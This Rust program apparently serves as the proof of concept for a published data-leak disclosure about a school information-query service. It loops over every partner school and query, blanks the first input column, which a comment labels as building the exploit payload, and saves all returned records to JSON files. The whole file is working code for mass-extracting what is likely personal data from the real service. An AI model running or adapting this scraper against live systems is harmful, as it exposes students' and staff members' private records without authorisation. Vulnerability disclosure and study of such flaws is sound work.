use anyhow::Result;
use std::fs;
use yjqyapi::{
    infoquery::InfoQueryAccess, partners::PartnerSchoolsAccess, QyClient,
};

/// 获取“信息查询”的所有数据
/// 参见 <https://blog.xtexx.eu.org/2024/04/13-yjzqy-net-leak-disclosure/>
#[tokio::main]
async fn main() -> Result<()> {
    let c = QyClient::new(Default::default()).await?;
    for (school, school_name) in c.partner_schools().await? {
        println!("学校：{} {}", school, school_name);
        for query in c.info_queries(&school).await? {
            println!("    查询：{}", query.text);
            let dir = format!(
                "output/{}{}/{}{}",
                school, school_name, query.id, query.text
            );
            fs::create_dir_all(&dir)?;

            let mut cols =
                c.info_query_input_columns(&school, &query.id).await?;

            fs::write(
                format!("{}/cols.json", &dir),
                serde_json::to_string_pretty(&cols)?,
            )?;

            // 构造利用载荷
            "".clone_into(&mut cols[0].text);
            let results = c
                .do_info_query(&school, &query.id, [(&cols[0], "啊对对对")])
                .await?;
            fs::write(
                format!("{}/results.json", &dir),
                serde_json::to_string_pretty(&results)?,
            )?;
        }
    }
    Ok(())
}
